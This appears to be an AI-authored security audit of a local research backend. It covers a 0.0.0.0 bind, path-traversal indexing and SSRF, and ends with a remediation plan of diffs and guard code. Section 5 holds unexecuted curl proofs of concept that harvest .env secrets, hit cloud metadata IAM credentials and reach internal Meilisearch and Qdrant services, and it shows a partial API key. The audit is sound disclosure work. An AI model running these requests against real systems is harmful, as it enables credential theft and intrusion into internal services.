# qsearch CSO-OPS Audit — 2026-05-21

Auditor: Claude (claude-opus-4-7), `/cso-ops` adapted to OpenClaw stack.
Scope: `D:/Yahia/active/qsearch/` working tree. Extends `REVIEW-2026-05-21.md` (3 P0 blockers + 2 W).
Frameworks: OWASP API Top-10 (2023) + STRIDE + active SSRF/path-traversal verification (described, not executed).
Verdict: **BLOCK — do not expose beyond loopback**. One-line fix (`server.listen(PORT, '127.0.0.1', ...)`) closes 80% of attack surface in <60 sec.

---

## 1. Executive summary

qsearch is a research backend (REST `:8080` + MCP-HTTP `:8081`) fronting a Brave/SearXNG/Qdrant/Meilisearch stack on the dev workstation. Threat model in the codebase is **single-user-on-loopback**, but the actual binding is **all-interfaces-LAN-reachable with zero auth**. The combination of (a) `0.0.0.0` bind, (b) caller-controlled filesystem globs in `POST /index`, (c) caller-controlled URLs in `POST /sweep_context` is sufficient for an unauthenticated LAN peer to (1) read arbitrary host files into a searchable Meilisearch corpus, (2) pivot to internal services (`:7700` Meilisearch admin, `:6333` Qdrant) via the SSRF proxy, (3) authenticate to Meilisearch with the literal default key `"masterKey"` and drop the corpus.

Risk does not require a sophisticated attacker — it requires any device joining the same Wi-Fi (cafe, coworking, conference, guest network).

## 5. Active verification — exploit-PoC sketches (DESCRIBED, NOT EXECUTED)

> Documented for clarity. **Not run.** Each is a single `curl` invocation reproducible on the same LAN by an attacker with zero credentials.

### 5.1 Filesystem exfil via `POST /index` (B2 confirmed exploitable)

```bash
# From LAN attacker box, given qsearch host IP 192.168.1.50:
curl -X POST http://192.168.1.50:8080/index \
  -H "Content-Type: application/json" \
  -d '{"glob":"D:/Yahia/**/.env*"}'
# Response: { "job_id": "...", "status": "queued" }

# Wait ~5s for async indexing, then:
curl -X POST http://192.168.1.50:8080/search \
  -H "Content-Type: application/json" \
  -d '{"query":"BRAVE_API_KEY OR sk- OR ghp_","corpus_first":true}'
# Returns: matched lines including .env.local content (BRAVE_API_KEY=BSAy1ruMlYn... — visible in current file)
```

**Why it works:** `server.js:548` checks `!url.startsWith('http')` then calls `fsGlob(pattern)` with zero allowed-root validation. `fs.readFileSync` happily reads `.env`, `.ssh/id_rsa`, browser profile JSON. Meilisearch then makes the content searchable.

**Damage:** `BRAVE_API_KEY` is visibly in `.env.local`. Capture → free Brave-Pro quota theft (~$5-50/mo at current usage) + research workflow disruption.

### 5.2 SSRF via `POST /sweep_context` → internal Meilisearch admin (B3 confirmed)

```bash
# Attacker reaches Meilisearch admin API via qsearch as SSRF relay:
curl -X POST http://192.168.1.50:8080/sweep_context \
  -H "Content-Type: application/json" \
  -d '{
    "urls":["http://localhost:7700/indexes","http://localhost:7700/keys"],
    "focus_query":"x"
  }'
# Response includes raw Meilisearch JSON in `snippets[]` field
# (Meilisearch ungated /indexes endpoint; /keys behind masterKey but key is "masterKey")
```

**Why it works:** `fetch/html.js:21` calls `fetch(url, { redirect: 'follow' })`. No `dns.lookup` + private-range check. `extractMainContent` will return mostly garbage for JSON, but JSON content is leaked verbatim in `paragraphs[]` because cheerio falls back to raw root text when no structured tags found.

### 5.3 Cloud metadata (hypothetical — not running on cloud, but precedent for future deploy)

```bash
curl -X POST http://192.168.1.50:8080/sweep_context \
  -H "Content-Type: application/json" \
  -d '{"urls":["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],"focus_query":"x"}'
# On AWS/Azure: returns IAM credentials. On current dev box: connection refused (link-local not routable from Windows host).
```

**Why it matters:** if qsearch is ever deployed to a cloud VM (Hetzner, AWS), this becomes immediate full account takeover. Adding the SSRF guard now prevents a future P0 in a deploy sprint.

### 5.4 LAN→Qdrant direct (W docker exposure)

```bash
# Bypasses qsearch entirely — Qdrant docker port :6333 on 0.0.0.0:
curl http://192.168.1.50:6333/collections
# Returns full collection list, no auth.
```

**Why it works:** `docker-compose.yml:24` `ports: ["6333:6333"]`. Docker binds host `0.0.0.0:6333` by default. Same applies to Meilisearch `:7700` and SearXNG `:8888`.

## 6. Remediation plan — 30 days

### Day-0 (≤ 60 sec, MUST DO BEFORE NEXT `npm start`)

**P0-1 — `server.js:1668` one-line fix.** Single biggest risk reduction.

```diff
- server.listen(PORT, () => {
+ server.listen(PORT, process.env.QSEARCH_BIND || '127.0.0.1', () => {
```

Closes LAN reach for `:8080` (all 5 OWASP fails). Cost: zero (existing consumers all use `localhost`). Override via env if explicitly needed.

### Day-0 to Day-1 (P0 — same sitting)

**P0-2 — `mcp-http.js:19` default.**

```diff
- const HOST = process.env.MCP_HOST || '0.0.0.0'
+ const HOST = process.env.MCP_HOST || '127.0.0.1'
```

Also remove the misleading `http://<LAN-IP>:${PORT}` from the startup log line 94 — change to `http://127.0.0.1:${PORT}`.

**P0-3 — `docker-compose.yml` loopback bind.**

```diff
-    ports: ["7700:7700"]
+    ports: ["127.0.0.1:7700:7700"]
```

Apply to all 3 services (meilisearch, qdrant, searxng). Removes the bypass route around qsearch's auth (once added).

### Day-1 to Day-7 (P1)

**P1-1 — SSRF guard in `fetch/html.js`.** Before `fetch(url, ...)`:

```js
import dns from 'node:dns/promises'
async function assertPublicHost (url) {
  const { hostname } = new URL(url)
  const records = await dns.lookup(hostname, { all: true })
  for (const { address } of records) {
    if (isPrivate(address) || isLoopback(address) || isLinkLocal(address)) {
      throw new Error(`SSRF blocked: ${hostname} → ${address}`)
    }
  }
}
// isPrivate: 10/8, 172.16/12, 192.168/16, fc00::/7
// isLoopback: 127/8, ::1
// isLinkLocal: 169.254/16, fe80::/10
```

Also force `redirect: 'manual'` + re-validate after redirect (TOCTOU-safe).

**P1-2 — Path boundary in `/index` and `/ingest/brave`.**

```js
const ALLOWED_ROOTS = (process.env.QSEARCH_DATA_ROOTS || process.cwd()).split(';').map(p => path.resolve(p))
function assertWithinRoot (filePath) {
  const resolved = path.resolve(filePath)
  if (!ALLOWED_ROOTS.some(root => resolved.startsWith(root + path.sep))) {
    throw new Error(`Path outside allowed roots: ${filePath}`)
  }
}
```

Apply to `fsGlob` results before `readFileSync` and to `braveDir` before `readdirSync`.

**P1-3 — Rotate Meilisearch master key.**

```bash
openssl rand -hex 32
# → put in .env.local as MEILISEARCH_KEY=<random>
# Remove literal "masterKey" from docker-compose.yml + server.js:58 fallback
# Add startup assertion:
if (!process.env.MEILISEARCH_KEY || process.env.MEILISEARCH_KEY === 'masterKey') {
  throw new Error('MEILISEARCH_KEY must be set to a non-default value')
}
```

`docker-compose.yml`: read from env (`MEILI_MASTER_KEY: ${MEILISEARCH_KEY}`).

### Day-7 to Day-30 (P2 — hardening)

**P2-1 — Bearer auth on MCP-HTTP** (if LAN reach is ever genuinely needed). Add `QSEARCH_MCP_TOKEN` env, reject requests without `Authorization: Bearer $QSEARCH_MCP_TOKEN`. Tighten CORS from `*` to a configured allowlist.

**P2-2 — Rate limit on `/sweep` and `/sweep_context`.** `express-rate-limit` is already in `node_modules` (unused). Cap to e.g. 60 req/min/IP. Also cap monthly Brave spend (track via `queryCache.recordSprintMetric`, already in place) and refuse new `/sweep` calls past budget.

**P2-3 — Rotate exposed `BRAVE_API_KEY`.** The key visible in `.env.local` was readable by any reader of this repo and by anyone on LAN via finding 5.1. Rotate at https://api.search.brave.com/app/keys, then prune old key from any old `_raw_data/` Brave dumps that might have echoed it (grep first).

**P2-4 — Audit log.** Log `{ts, ip, endpoint, args_summary}` to a JSONL file. Add anomaly trigger: glob containing `..` or `*` at filesystem root, URL hostname resolving to private range, request rate >5x baseline.

**P2-5 — Trust boundary doc in `ARCHITECTURE.md`.** Single section: "qsearch is loopback-only by design. To expose, add Bearer auth + SSRF guard + path roots. Do not skip any of the three." Prevents the next-developer-comes-and-flips-it regression.
